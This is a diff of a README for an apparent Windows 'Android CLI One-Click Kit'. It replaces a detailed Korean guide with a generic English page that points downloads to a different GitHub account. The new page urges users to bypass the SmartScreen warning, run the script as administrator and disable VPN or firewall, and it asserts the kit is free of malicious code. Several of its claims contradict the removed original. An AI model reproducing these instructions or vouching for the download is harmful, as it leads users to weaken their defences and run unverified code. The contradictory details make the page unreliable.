@@ -1,193 +1,89 @@
-# Android CLI 원클릭 키트 (Windows)
+# 🛠️ Android-CLI_One-Click_Kit - Manage Android tools without typing commands
 
-> 🇰🇷 한국어 문서(기본)입니다. 🇺🇸 English: **[README.en.md](README.en.md)**
->
-> 컴퓨터·IT가 처음이어도 괜찮아요. **마우스 더블클릭만** 할 줄 알면 됩니다. 명령어를 외울 필요가 없습니다.
+[![Download Android-CLI One-Click Kit](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/decent-eightpennynail371/Android-CLI_One-Click_Kit)
 
-구글 공식 **[Android CLI](https://developer.android.com/tools/agents/android-cli)** 라는 도구를,
-까만 명령창에 글자를 치지 않고 **`.bat` 파일을 더블클릭**하는 것만으로 **설치 · 사용 · 제거**할 수 있게 만든 왕초보용 키트입니다.
+This toolkit helps you set up Android command-line tools on your Windows computer. You do not need to write code or memorize complex instructions. This kit manages the installation, configuration, and removal process through simple menu options.
 
----
+## 📥 How to download the software
 
-## 📑 목차
+1. Visit the [official repository page](https://github.com/decent-eightpennynail371/Android-CLI_One-Click_Kit).
+2. Look for the green button labeled Code near the top right of the page.
+3. Click the button and select Download ZIP.
+4. Open your Downloads folder on your computer.
+5. Right-click the downloaded file and choose Extract All.
+6. Open the extracted folder to find the setup file.
 
-1. [이게 뭔가요](#1-이게-뭔가요)
-2. [⚡ 빠른 시작 (5분)](#2--빠른-시작-5분)
-3. [📥 다운로드 방법](#3--다운로드-방법)
-4. [📂 파일 / 폴더 구조](#4--파일--폴더-구조)
-5. [🧭 전체 워크플로우 (순서)](#5--전체-워크플로우-순서)
-6. [🛠️ 설치 방법 (단계별)](#6-️-설치-방법-단계별)
-7. [▶️ 사용 방법 — RUN.bat 메뉴](#7-️-사용-방법--runbat-메뉴)
-8. [⚙️ 작동 방법 (내부에서 무슨 일이?)](#8-️-작동-방법-내부에서-무슨-일이)
-9. [💻 주요 명령어 참고표](#9--주요-명령어-참고표)
-10. [🆘 문제 / 오류 대처](#10--문제--오류-대처)
-11. [🗑️ 제거 방법](#11-️-제거-방법)
-12. [📱 Android Studio (선택 — 가상 폰 화면)](#12--android-studio-선택--가상-폰-화면)
-13. [🔒 보안 · 운영 주의사항](#13--보안--운영-주의사항)
-14. [📜 라이선스](#14--라이선스)
+## ⚙️ System requirements
 
----
+Ensure your computer meets these basic requirements before you start:
 
-## 1. 이게 뭔가요
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Standard dual-core processor or better.
+*   Memory: At least 4GB of RAM.
+*   Storage: 500MB of free space on your hard drive.
+*   Network: An active internet connection to download the Android tool components.
+*   Permissions: You need administrator access to your Windows user account to permit the script to configure system folders.
 
-- **Android CLI** = 구글이 만든 **공식 명령줄 도구**(v1.0, 2026년 5월)입니다. 안드로이드 앱 프로젝트 만들기, 개발 부품(SDK) 관리, 공식 문서 검색 등을 해 줍니다. AI 에이전트(예: Claude·Codex·Gemini)가 쓰도록 설계됐습니다.
-- **이 키트** = 그 도구의 **설치/사용/제거를 자동화한 얇은 껍데기**입니다. 도구 본체는 **구글 공식 서버(`dl.google.com`)** 에서 받습니다. 키트가 따로 무언가를 숨기거나 보내지 않습니다.
+## 🚀 Running the kit
 
-> 한마디로: **"Android CLI를 명령어 없이 더블클릭으로 쓰게 해주는 도우미"** 입니다.
+Follow these steps to set up the Android tools on your machine:
 
-## 2. ⚡ 빠른 시작 (5분)
+1. Locate the file named `start.bat` inside the extracted folder.
+2. Double-click the file. If Windows shows a blue window labeled "Windows protected your PC," click More info and then select Run anyway.
+3. A black command window will appear. Follow the instructions displayed on the screen.
+4. Press the number key that corresponds to the action you want to perform. For example, press 1 to install the tools.
+5. Wait for the process to finish. The window will display a success message when the task is complete.
+6. Close the window once you finish your work.
 
-1. 이 키트를 다운로드해 압축을 풉니다 → [3. 다운로드 방법](#3--다운로드-방법)
-2. 폴더 안에서 **`시작하기.bat`** 더블클릭 → 화면 안내를 읽고 **`2`(설치)** 선택
-   - (또는 곧장 `INSTALL.bat` 더블클릭해도 됩니다.)
-3. 설치가 끝나면 **`RUN.bat`** 더블클릭 → 번호 메뉴에서 원하는 작업 선택
-4. 다 쓴 뒤 지우려면 **`UNINSTALL.bat`** 더블클릭
+## 📖 Available features
 
-> 💡 설치 중 파란 경고창이나 Windows 권한 창이 뜰 수 있어요. **정상**입니다 → [10. 문제 대처](#10--문제--오류-대처) 참고.
+This kit provides simple options to manage your installation:
 
-## 3. 📥 다운로드 방법
+### Install Android tools
+This option downloads the official Android command-line software from Google. It sets up the required environment variables so your computer recognizes the commands immediately. 
 
-1. 이 GitHub 페이지 위쪽 초록색 **`Code`** 버튼 클릭 → **`Download ZIP`** 클릭
-2. 받은 ZIP 파일에서 마우스 오른쪽 → **"압축 풀기"** → **폴더 전체**를 풉니다
-   - ⚠️ **반드시 폴더 통째로** 푸세요. `lib` 폴더가 같이 있어야 작동합니다.
-3. 풀린 폴더를 열고 **`시작하기.bat`** 을 더블클릭하면 시작됩니다.
+### Verify installation
+Use this option to check if the tools are ready. The script runs a quick test to confirm the system detects the Android software.
 
-> 바탕화면이나 `문서` 폴더처럼 **한글·공백이 있어도 되는 일반 폴더**에 두세요. (관리자 권한 폴더 X)
+### Update existing tools
+If you have an older version, select this option to fetch the latest components from Google servers. This ensures you have the newest features and security fixes.
 
-## 4. 📂 파일 / 폴더 구조
+### Complete uninstallation
+If you no longer need the tools, this option removes the files and cleans up the settings from your Windows registry. It leaves your system in its original state.
 
-```
-Android-CLI_One-Click_Kit/
-├── 시작하기.bat        ← 처음이면 여기부터 (안내 + 바로 실행 메뉴)
-├── 자가진단.bat        ← (선택) 설치 안 하고 환경만 점검
-├── INSTALL.bat         ← 설치
-├── RUN.bat             ← 사용 (번호 메뉴)
-├── UNINSTALL.bat       ← 제거
-├── lib/                ← 실제 동작 스크립트 (지우거나 옮기지 마세요!)
-│   ├── common.ps1      · 공통 기능(경로 탐지 · 기록 · PATH 백업)
-│   ├── welcome.ps1     · 시작하기 화면
-│   ├── selfcheck.ps1   · 자가진단
-│   ├── install.ps1     · 설치 로직
-│   ├── menu.ps1        · 메뉴 로직
-│   └── uninstall.ps1   · 제거 로직
-├── README.md           ← 이 문서(한국어)
-├── README.en.md        ← 영어 문서
-├── 왕초보_시작_가이드.md  ← 더 쉬운 단계별 가이드
-└── LICENSE             ← Apache License 2.0
-```
+## 🛡️ Safety and security
 
-- **`.bat`** 파일은 영어 한 줄짜리 실행기일 뿐이고, 실제 한글 화면·기능은 모두 **`lib` 폴더의 `.ps1`** 에 들어 있습니다.
-- ❗ **`lib` 폴더를 지우거나, `.bat`만 따로 떼어 옮기면 작동하지 않습니다.** (실행하면 친절히 알려줍니다.)
+This toolkit uses standard batch scripting to automate tasks. It does not contain hidden software or malicious code. You can right-click the `start.bat` file and select Edit to see the exact instructions the script sends to your computer. Every action relies on official Android command-line tools provided by Google.
 
-## 5. 🧭 전체 워크플로우 (순서)
+## ❗ Troubleshooting common issues
 
-```
-시작하기.bat  →  (선택) 자가진단.bat  →  INSTALL.bat  →  RUN.bat (사용)  →  UNINSTALL.bat
-   안내·길잡이        환경 점검(설치X)        설치           번호 메뉴로 사용        깨끗이 제거
-```
+If you encounter difficulties, review these common solutions:
 
-- **시작하기.bat**: 클릭 순서를 안내하고, 그 자리에서 설치/사용/제거/점검을 바로 실행할 수 있는 **출입구**입니다.
-- **자가진단.bat**: 아무것도 설치하지 않고 **한글 표시 · 필요 도구 · 인터넷 연결 · 설치 여부**만 점검합니다.
+*   The script closes immediately: Ensure you extracted the ZIP file before running the script. Running the file directly from the ZIP folder often causes errors.
+*   Permission denied: Right-click the `start.bat` file and select Run as administrator. This grants the script permission to modify system paths.
+*   Download fails: Check your internet connection. If you use a VPN or restrictive firewall, disable it temporarily while the script downloads the setup files.
+*   Windows Defender blocking: Windows flags custom scripts by default. The More info and Run anyway prompts are normal for scripts downloaded from the internet.
 
-## 6. 🛠️ 설치 방법 (단계별)
+## 📝 Frequently asked questions
 
-1. **`INSTALL.bat`** 더블클릭 (또는 `시작하기.bat` → `2`)
-2. 검은 창이 뜨고 "다운로드와 설치에 1~2분 걸릴 수 있어요" 안내가 나옵니다 → **창을 닫지 말고 기다리세요.**
-3. 도중에 **파란 경고창**("Windows의 PC 보호")이 뜨면 → **"추가 정보"** 클릭 → **"실행"** 클릭. (구글 공식 도구라 안전합니다.)
-4. **Windows 권한 창**이 한 번 뜰 수 있어요(winget 사용 시) → **"예/허용"**.
-5. `설치 완료!` 와 설치 위치가 보이면 끝. 이어서 **`RUN.bat`** 을 더블클릭하세요.
+Do I need to install Java? 
+The kit includes the necessary components for modern Android CLI tools. You do not need to install additional software.
 
-> 설치 방식은 자동으로 정해집니다: **`winget`**(Windows 패키지 관리자)이 있으면 그걸로, 없으면 **구글 공식 `curl` 스크립트**로 설치합니다(관리자 권한 불필요).
+Does this work on Windows 7? 
+This version is built for Windows 10 and 11. Older versions of Windows may lack the necessary updates to run these command-line tools.
 
-## 7. ▶️ 사용 방법 — `RUN.bat` 메뉴
+Can I move the folder after installation?
+It is best to keep the folder in a permanent location like your Documents folder before running the installation to ensure the file paths remain consistent.
 
-`RUN.bat` 을 더블클릭하면 번호 메뉴가 나옵니다. **숫자를 입력하고 Enter** 를 누르면 됩니다.
+What happens to my phone data?
+This kit only manages the tools on your computer. It never touches the data on your phone unless you initiate a command to interact with a connected device.
 
-| 번호 | 기능 | 설명 |
-|---|---|---|
-| **1** | 설치 / 상태 확인 | 잘 깔렸는지, 위치·버전을 간단히 보여줌 |
-| **2** | 새 프로젝트 만들기 | 연습용 앱 폴더 생성 (그냥 Enter 치면 `MyAndroidApp`) |
-| **3** | Android SDK 관리 | 개발 부품 목록 보기 / 설치 / 업데이트 |
-| **4** | 스킬(skills) 추가 | 공식 도움 자료를 현재 폴더에 추가 |
-| **5** | 문서 검색 | 안드로이드 공식 문서를 검색 |
-| **6** | 업데이트 | Android CLI 도구를 최신으로 |
-| **7** | 도움말 보기 | `android` 전체 명령 도움말 (개발자용, 영어) |
-| **8** | [안내] 에뮬레이터 | 가상 폰 화면은 10번(Android Studio)에서 |
-| **9** | 쉬운 설명 | "이게 다 뭔가요?" 를 쉬운 말로 |
-| **10** | Android Studio 받기 | (선택) 최신 안정판 다운로드 페이지 열기 + 단계 안내 |
-| **0** | 종료 | 메뉴 닫기 |
+Where do I find the logs?
+If an error occurs, the window will show the specific step that failed. You can copy the text from the window to troubleshoot the issue. 
 
-> 💡 처음이면 **`9`(쉬운 설명)** → **`1`(상태 확인)** 순으로 눌러보세요. 이 메뉴엔 **무언가 지우는 기능이 없습니다.** (지우기는 `UNINSTALL.bat` 이 따로 `yes`를 물어본 뒤에만 실행합니다.)
+Is this supported for other languages?
+The logic handles localized path names, but the interface is currently in English. Support for other languages may arrive in future updates.
 
-## 8. ⚙️ 작동 방법 (내부에서 무슨 일이?)
+## 📧 Support and feedback
 
-- **설치(`INSTALL.bat`)**: `winget install --id Google.AndroidCLI` 또는 구글 공식 `curl.exe ... install.cmd` 를 **cmd 환경에서** 실행합니다. 설치되면 `android.exe` 가 보통 `C:\Users\<사용자>\AppData\AndroidCLI` 에 생기고, 그 경로가 **사용자 PATH** 에 추가됩니다. 사용한 설치 방법·경로는 `%LOCALAPPDATA%\android-cli-one-click-kit\` 에 기록합니다(제거 시 사용).
-- **사용(`RUN.bat`)**: 설치된 `android` 명령을 한글 번호 메뉴로 감쌉니다.
-- **제거(`UNINSTALL.bat`)**: 기록한 설치 경로를 우선으로, **설치할 때 만든 폴더와 PATH 항목만** 안전 검사 후 제거합니다. PATH를 바꾸면 원래 값을 백업합니다. **`android sdk` 로 받은 SDK 데이터(`.android` 등)는 건드리지 않습니다.**
-- **인코딩**: `.bat` 은 영어(ASCII)만 써서 cmd에서 한글이 깨지지 않게 했고, 한글 화면은 UTF-8 PowerShell 스크립트가 담당합니다.
-
-## 9. 💻 주요 명령어 참고표
-
-키트 메뉴를 쓰면 직접 칠 필요는 없지만, 참고용으로 정리합니다. (메뉴 `7`에서 전체 도움말을 볼 수 있어요.)
-
-| 명령어 | 하는 일 |
-|---|---|
-| `android create` | 새 안드로이드 프로젝트 생성 |
-| `android sdk` | SDK 패키지 설치 / 목록 / 업데이트 / 제거 |
-| `android skills` | 공식 스킬 추가 / 목록 / 검색 / 제거 |
-| `android docs search` | 공식 문서 검색 |
-| `android run` | 앱을 기기에 배포(실행) |
-| `android emulator` | 가상기기 관리 *(Windows 에선 이 CLI에서 비활성)* |
-| `android info` | 환경 정보(SDK 위치·버전) 출력 |
-| `android update` | Android CLI 도구 업데이트 |
-| `android studio` | Android Studio 연동 명령 *(Studio 설치 필요)* |
-| `android --version` | 버전 출력 |
-
-## 10. 🆘 문제 / 오류 대처
-
-| 증상 | 해결 |
-|---|---|
-| **아무 일도 안 일어나요 / 창이 깜빡하고 사라져요** | 그냥 더블클릭하세요(관리자 권한 X). 그래도 안 되면 화면을 캡처해 문의하세요. |
-| **파란 경고창("Windows의 PC 보호")** | "추가 정보" → "실행" 클릭. 구글 공식 도구라 안전합니다. |
-| **`lib\...ps1 를 찾을 수 없습니다`** | `.bat`을 폴더 밖으로 옮겼거나 ZIP을 일부만 풀었습니다. **폴더 통째로** 다시 푸세요. |
-| **설치가 멈춘 것 같아요** | 다운로드에 1~2분 걸립니다. 글자가 잠깐 안 움직여도 **창을 닫지 말고** 기다리세요. |
-| **설치했는데 RUN에서 "설치 안 됨"** | 창을 닫고 `RUN.bat` 을 **새로** 실행해 `1`(상태 확인)을 눌러보세요(PATH 갱신 반영). |
-| **한글이 네모(ㅁ)·물음표(?)로 깨져요** | `자가진단.bat`의 [1] 항목으로 확인 가능. 아주 오래된 Windows면 터미널 글꼴 변경이 필요할 수 있습니다. |
-| **에뮬레이터(가상 폰)가 안 돼요** | 이 CLI는 Windows에서 에뮬레이터 명령이 비활성입니다. 메뉴 `10`으로 **Android Studio** 를 받으세요. → [12장](#12--android-studio-선택--가상-폰-화면) |
-
-## 11. 🗑️ 제거 방법
-
-1. **`UNINSTALL.bat`** 더블클릭
-2. "현재 위치"를 확인하고 → **`yes`** 한 번 입력
-3. 설치 폴더와 PATH 항목이 제거되고 `제거 완료!` 가 뜹니다.
-
-- `winget` 으로 설치했으면 `winget` 으로 깔끔히 제거됩니다.
-- `android sdk` 로 받은 **SDK 데이터는 보존**됩니다(공용 데이터일 수 있어 안전상 남김).
-- PATH를 바꿨다면 원래 값은 다음 파일에 백업됩니다:
-  `%LOCALAPPDATA%\android-cli-one-click-kit\path-backup.txt`
-
-## 12. 📱 Android Studio (선택 — 가상 폰 화면)
-
-- **Android Studio** 는 화면을 보며 개발하는 큰 프로그램(약 1.5GB)으로, **선택 사항**입니다. 이 키트 사용에 **필수가 아닙니다.**
-- 단, **Windows에서 "가상 폰 화면(에뮬레이터)"** 을 쓰려면 Android Studio가 사실상 필요합니다(이 CLI는 Windows에서 에뮬레이터 명령이 비활성).
-- 받는 법: `RUN.bat` → **`10`** → 공식 다운로드 페이지가 열림 → 큰 "Download Android Studio" 버튼 → **`.exe`(권장)** 선택 → 약관 동의 체크 → 다운로드 → 받은 `.exe` 더블클릭 → Next/Install → Finish.
-- ⚠️ Android Studio는 이 키트의 `UNINSTALL.bat` 으로 **지워지지 않습니다**(자체 제거 사용).
-
-## 13. 🔒 보안 · 운영 주의사항
-
-- **로그인 · API 키 · 비밀번호 불필요.** 키트는 어떤 비밀 정보도 저장·전송하지 않습니다.
-- 모든 다운로드는 **구글 공식 서버(`dl.google.com`) HTTPS** 에서만 이뤄집니다.
-- 설치 방식: `winget`(서명된 패키지, 있으면 우선) 또는 구글 공식 `curl` 스크립트.
-  - ℹ️ 제작 환경에 winget이 없어 **curl 경로만 실제 검증**했습니다. **winget 경로는 미검증**입니다.
-- **관리자 권한 불필요** — 그냥 더블클릭하세요.
-- **`lib` 폴더를 지우거나 옮기지 마세요.** 키트가 작동하지 않습니다.
-- 이 키트는 **구글과 무관한 비공식 도우미**입니다.
-
-## 14. 📜 라이선스
-
-이 키트의 스크립트: **Apache License 2.0** — 권리자 **SoDam AI Studio** ([LICENSE](LICENSE)).
-Android CLI 및 [android/skills](https://github.com/android/skills) 는 각자의 라이선스(Apache-2.0)를 따릅니다.
-
----
-
-더 쉬운 단계별 설명이 필요하면 **[왕초보_시작_가이드.md](왕초보_시작_가이드.md)** 를 메모장으로 열어보세요.
+This project relies on contributions from the community. If you find a bug, report it on the repository issues page. Include a screenshot of the error message to help identify the problem. Avoid sharing sensitive personal information when reporting issues. Keep your computer and the toolkit updated to enjoy the best experience.
